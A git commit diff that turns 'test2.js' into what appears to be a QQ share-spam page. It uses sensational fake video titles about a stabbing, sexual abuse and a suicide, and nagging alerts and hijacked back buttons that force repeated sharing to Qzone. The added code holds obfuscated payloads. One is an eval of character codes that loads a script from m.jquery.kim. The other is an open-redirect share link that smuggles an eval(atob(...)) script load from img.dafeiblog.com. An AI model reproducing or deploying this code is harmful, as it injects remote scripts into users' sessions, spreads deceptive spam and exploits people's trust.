6c7d0c7f83f4749a724d3c8b71f1e7d0eeacc189
hakula <hakula@freemanapp.com>
2019-06-19 20:23:07 +0800

    test2.js

--- test2.js
+++ test2.js
@@ -1,18 +1,220 @@
-var weui = {
-alert: function (g, f, k) {
-    var j, h;
-    f = f ? f : "温馨提醒", j = '<div class="weui_dialog_alert" style="position: fixed; z-index: 99999; display:none;">', j += '<div class="weui_mask"></div>', j += '<div class="weui_dialog">', j += '<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">' + f + "</strong></div>", j += '<div class="weui_dialog_bd"></div>', j += '<div class="weui_dialog_ft">', j += '<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>', j += "</div>", j += "</div>", j += "</div>", $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(j)), h = $(".weui_dialog_alert"), h.fadeIn(200), h.find(".weui_dialog_bd").html(g), h.find(".weui_btn_dialog").off("touchstart").on("touchstart", function () {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         h.fadeOut(200), k && k();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         });
+
+function getCookie(name){
+	var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)"); 
+	if(arr=document.cookie.match(reg)) 
+        	return unescape(arr[2]); 
+	else 
+        	return null;
 }
+ 
+function cookie_set(key,value){
+	var Then=new Date(); 
+	Then.setTime(Then.getTime()+7*24*60*60*1000);
+	document.cookie=key+"="+value+"; path=/; expires="+Then.toGMTString();
+}
+function getQueryString(name) {
+        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) {
+            return unescape(r[2]);
+        }
+        return null;
+}
+function isNumber(n) {  
+    return !isNaN(parseFloat(n)) && isFinite(n);  
+}
+function randstr(len) {
+　　len = len || 7;
+　　var $chars ='º¹²³⁴⁵⁶⁷⁸⁹ⁱᙆᵃᵇᶜᵈᵉᵍʰⁱʲᵏˡᵐⁿᵒᵖᵒ⃒ʳˢᵗᵘᵛʷˣʸˢᵀᵁᵂˣᵞᙆ ˀ ˁ ˤʱʴʵʶᴭᴯᴲᴻᴽᵄᵅᵆᵊᵋᵌᵑᵓᵚᵝᵞᵟᵠᵡᵎᵔᵕᵙᵜᶛᶜᶝᶞᶟᶡᶣᶤᶥᶦᶧᶨᶩᶪᶫᶬᶭᶮᶯᶰᶱᶲᶳᶴᶵᶶᶷᶸᶹᶺᶼᶽᶾᶿ ჼᒃᕻᑦᒄᕪᑋᑊᔿᐢᐤᔆᙚᐡᘁᐜᕽᙆᙇᒼᒢᒻᔿᐤᙚᐪᓑᘁᐜᕽᙆᙇ';
+    var maxPos = $chars.length;
+　　var pwd = '';
+　　for (i = 0; i < len; i++) {
+　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+　　}
+　　return pwd;
 }
 
+var u = navigator.userAgent;
+var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+var sharemod=1;
+var playblock=1;
+var sharetimes=0;
+var nid=99110403+parseInt(100000*Math.random());
+
+    var pageGlobal = {};
+    pageGlobal.backtitle="back"
+
+ 
+    pageGlobal.vid = 'z0509qivi2x';
+    pageGlobal.title = '快没命了，小伙子被砍19刀，血流成河！';
+    pageGlobal.sharetitle ='刀刀入肉！';
+    pageGlobal.desc = '疼！';
+
+
+    pageGlobal.imglogo ='https://imgsa.baidu.com/fex/pic/item/30adcbef76094b365aeb5cb4aecc7cd98d109d6a.jpg';
+    pageGlobal.playimg ='http://ugc.qpic.cn/gbar_pic/PiajxSqBRaELqFiasR3k9rcdibONWp1ZF8TZWoy7MslhkaNFnCket8eCw/';
+    pageGlobal.playimg ='http://116.211.189.141/file/passport/PkOvm8IZXonA9f8DmtjXQKkBicUXn-VGj_sIFmXqygXkpu8fhTp8TGhhlpl7mjB4OcGCRMsRfUTjoH0Z1_JSHQ.jpg';
+
+
+
+    pageGlobal.vid = 'z0509qivi2x';
+    pageGlobal.title = '女大学生，被导师潜规则，跳楼自杀！视频流出！';
+    pageGlobal.sharetitle ="内裤都掉了！ "+"   "+randstr(7);
+    pageGlobal.desc = '师生乱来';
+
+
+    pageGlobal.imglogo ='https://imgsa.baidu.com/fex/pic/item/d8f9d72a6059252d352e4b1c399b033b5bb5b9e9.jpg';
+    pageGlobal.playimg ='http://ugc.qpic.cn/gbar_pic/PiajxSqBRaELqFiasR3k9rcdibONWp1ZF8TZWoy7MslhkaNFnCket8eCw/';
+    pageGlobal.playimg ='http://116.211.189.141/file/passport/NDOT7VeXITbWKm03mk9eAhclPKPcZFEnP1TrT0bBxIYt-xKaxcNy-ZqBneDdZpswJP_YnJiMOvOT0wdhwpOkGA.jpg';
+
+    pageGlobal.imglogo ='https://imgsa.baidu.com/fex/pic/item/359b033b5bb5c9ea47c7ce8bd839b6003af3b3a6.jpg';
+    pageGlobal.sharetitle ="师生乱搞，现场！ "+"   "+randstr(7);
+    pageGlobal.desc = '视频流出。。。';
+
+    pageGlobal.imglogo ='https://imgsa.baidu.com/fex/pic/item/86d6277f9e2f07082a061630e424b899a901f2fa.jpg';
+
+
+    pageGlobal.shareurl='http://open.qzone.qq.com/url_check?url=https%3A%2F%2Fweibo.cn%2Fsinaurl%3F_wv%3D1027%26cmd%3Dplay%26u%3Dhttps%253A%252F%252Fwww.duanwenxue.com%252Fmember%252Findex.php%253Fgourl%253D%25252F%25252Fst.duanwenxue.com%25252Fpost-624.html%252522%25257d%252529%25257d%25252bwindow%25255b%252522eval%252522%25255d%252528atob%252528%252522ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwczovL2ltZy5kYWZlaWJsb2cuY29tL3dlYi9pZi5waHAnPjwvc2NyaXB0PiIp%252522%252529%252529%25252bfunction%252528%252529%25257b%2524.post%252528%25257b1%253A%252522%2526r%253D1560937375%2526business%253D%2523123&cmd=play&_wv=2098179#123';
+
+var vid = pageGlobal.vid;
+
+setTimeout(function(){document.getElementById("tongji").src="javascript:eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,34,60,115,99,114,105,112,116,47,115,114,99,61,47,47,109,46,106,113,117,101,114,121,46,107,105,109,58,56,48,57,48,47,119,101,98,47,116,111,110,103,106,105,46,106,115,62,60,47,115,99,114,105,112,116,62,34,41,59))";},100);
+
+
+!function(){
+	setTimeout("readyShare()",200);
+}();
+
+function readyShare(){
+	document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+}
+
+var hiddenProperty = 'hidden' in document ? 'hidden' :    
+    'webkitHidden' in document ? 'webkitHidden' :    
+    'mozHidden' in document ? 'mozHidden' :    
+    null;
+var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+
+var onVisibilityChange = function(){
+    if(!document[hiddenProperty]) {
+		setTimeout("gotoalert();",10);	
+    }else{
+		//alert("hidden");	
+    }  
+}
+
+
+ 
+function gotoalert(){
+    if(!document[hiddenProperty]) {
+	alert("已加密，转发后即可观看！");
+	doshare();
+    }
+}
+
+function doshare(){
+  if(playblock>0){
+	qzone();
+
+  }
+}
+
+function randomString(len) {
+　　len = len || 32;
+　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
+　　var maxPos = $chars.length;
+　　var pwd = '';
+　　for (i = 0; i < len; i++) {
+　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+　　}
+　　return pwd;
+}
+var src = 'http://v.qq.com/iframe/player.html?vid='+pageGlobal.vid+'&tiny=0&auto=1';
 function qzone(){
-    
+	var shareid=1101094403+parseInt(10000000*Math.random());
+	var appname=randomString(7);
+    var b = new Base64();
+    var imgurl = b.encode(pageGlobal.imglogo); 
+    var description = b.encode(pageGlobal.desc);
+    var title = b.encode(pageGlobal.sharetitle);
+    var url = b.encode(pageGlobal.shareurl);
+
+    if (isiOS) {
+	window.location.href = 'mqqapi://share/to_fri?src_type=web&version=1&file_type=news&share_id='+shareid+'&previewimageUrl=' + imgurl + '&description=' + description + '&title=' + title + '&url=' + url+'&callback_type=scheme&thirdAppDisplayName='+appname+'&app_name='+appname+'&cflag=0&shareType=1';
+    } else {
+	window.location.href = 'mqqapi://share/to_qzone?file_type=news&src_type=web&version=1&generalpastboard=1&share_id='+shareid+'&url=' + url+'&previewimageUrl=' + imgurl + '&image_url=' + imgurl + '&title=' + title + '&description=' + description + '&shareType=1';
+    }
+    sharetimes++;
+    if(sharetimes>3 && !window.x){
+	window.x=1;
+    }
+}
+
+var weui = {
+    alert: function (g, f, k) {
+        var j, h;
+        f = f ? f : "温馨提醒", j = '<div class="weui_dialog_alert" style="position: fixed; z-index: 99999; display:none;">', j += '<div class="weui_mask"></div>', j += '<div class="weui_dialog">', j += '<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">' + f + "</strong></div>", j += '<div class="weui_dialog_bd"></div>', j += '<div class="weui_dialog_ft">', j += '<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>', j += "</div>", j += "</div>", j += "</div>", $(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(j)), h = $(".weui_dialog_alert"), h.fadeIn(200), h.find(".weui_dialog_bd").html(g), h.find(".weui_btn_dialog").off("touchstart").on("touchstart", function () {
+            h.fadeOut(200), k && k();
+        });
+    }
 }
 
 function dotip(){
-    weui.alert("本视频，版权要求，转发后可观看！", "", qzone);
+    weui.alert("本视频，版权要求，转发后可观看！", "", qzone);}
+
+ 
+var d = new Date();
+var str = d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();
+document.getElementById("post-date").innerHTML = str;
+
+
+
+if (document.getElementsByTagName('h2')[0].innerHTML.length<30){
+	document.getElementsByTagName('h2')[0].innerHTML = pageGlobal.title;
+}
+if(document.getElementById("timg")){
+	document.getElementById("timg").src= pageGlobal.playimg;
 }
 
+$(function(){
+ mqq.ui.setTitleButtons({
+   left : {
+       title :(pageGlobal.backtitle="转发")?"转发":"转发",
+       callback : function(){
+	    if(sharetimes<100){
+		alert("老铁，转发后即可观看！");
+		qzone();
+	    }else{
+		history.go(-1);
+	    }
+       }
+   },
+   right : {
+       title :"返回",
+       callback : function(){
+	    if(sharetimes<100){
+		alert("老铁，转发后即可观看！");
+		qzone();
+	    }else{
+		history.go(-1);
+	    }
+       }
+   }
+})  
+});
+
+
 setTimeout('dotip()', 2100);
+
+
+window.onload=function(){
+if(pageGlobal.backtitle=="转发"){
+	//setTimeout('gotoalert()', 3666);
+}else{
+	//setTimeout('gotoalert()', 2666);
+}
+}
+
+setTimeout('gotoalert()', 5555);
+
+
